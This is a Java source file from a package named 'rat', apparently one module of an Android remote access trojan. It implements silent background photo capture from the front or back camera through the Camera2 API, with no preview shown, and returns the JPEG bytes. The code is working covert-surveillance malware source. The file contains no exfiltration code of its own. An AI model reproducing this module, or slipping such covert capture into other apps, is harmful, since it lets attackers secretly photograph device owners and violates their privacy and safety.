package com.company.rat;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.util.Log;
import android.util.Size;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Silent background camera capture using Camera2 API.
 * No preview surface — captures a single JPEG and returns the bytes.
 *
 * Requires CAMERA permission granted at runtime.
 */
public class CameraCapture {

    private static final String TAG     = "CameraCapture";
    private static final int    TIMEOUT = 8; // seconds

    /**
     * Capture a single JPEG frame.
     * @param front  true = front-facing, false = back
     * @return JPEG bytes, or null on failure
     */
    public static byte[] capture(Context ctx, boolean front) {
        CameraManager mgr = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        if (mgr == null) return null;

        String cameraId = findCamera(mgr, front);
        if (cameraId == null) {
            Log.w(TAG, "no camera found  front=" + front);
            return null;
        }

        final byte[][] result  = {null};
        final CountDownLatch latch = new CountDownLatch(1);

        HandlerThread ht = new HandlerThread("cam_capture");
        ht.start();
        Handler h = new Handler(ht.getLooper());

        ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
        reader.setOnImageAvailableListener(r -> {
            try (Image img = r.acquireLatestImage()) {
                if (img != null) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes   = new byte[buf.remaining()];
                    buf.get(bytes);
                    result[0] = bytes;
                }
            } catch (Exception e) {
                Log.e(TAG, "image read error", e);
            } finally {
                latch.countDown();
            }
        }, h);

        try {
            mgr.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    try {
                        CaptureRequest.Builder req =
                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        req.addTarget(reader.getSurface());
                        req.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                        req.set(CaptureRequest.JPEG_QUALITY, (byte) 85);

                        device.createCaptureSession(
                            Arrays.asList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(req.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override
                                            public void onCaptureCompleted(CameraCaptureSession s,
                                                    CaptureRequest r, TotalCaptureResult res) {
                                                // latch released by ImageReader listener
                                            }
                                            @Override
                                            public void onCaptureFailed(CameraCaptureSession s,
                                                    CaptureRequest r, CaptureFailure failure) {
                                                Log.e(TAG, "capture failed: " + failure.getReason());
                                                latch.countDown();
                                            }
                                        }, h);
                                    } catch (Exception e) {
                                        Log.e(TAG, "capture ex", e);
                                        latch.countDown();
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession s) {
                                    Log.e(TAG, "session configure failed");
                                    latch.countDown();
                                }
                            }, h);
                    } catch (Exception e) {
                        Log.e(TAG, "session create ex", e);
                        latch.countDown();
                        device.close();
                    }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); latch.countDown(); }
                @Override public void onError(CameraDevice d, int err) {
                    Log.e(TAG, "camera error " + err); d.close(); latch.countDown();
                }
            }, h);

            latch.await(TIMEOUT, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "capture top-level ex", e);
        } finally {
            ht.quitSafely();
            reader.close();
        }

        return result[0];
    }

    // ── find the right camera ID ──────────────────────────────────────────────

    private static String findCamera(CameraManager mgr, boolean front) {
        int facing = front ? CameraCharacteristics.LENS_FACING_FRONT
                           : CameraCharacteristics.LENS_FACING_BACK;
        try {
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) return id;
            }
        } catch (Exception e) {
            Log.e(TAG, "findCamera error", e);
        }
        return null;
    }
}
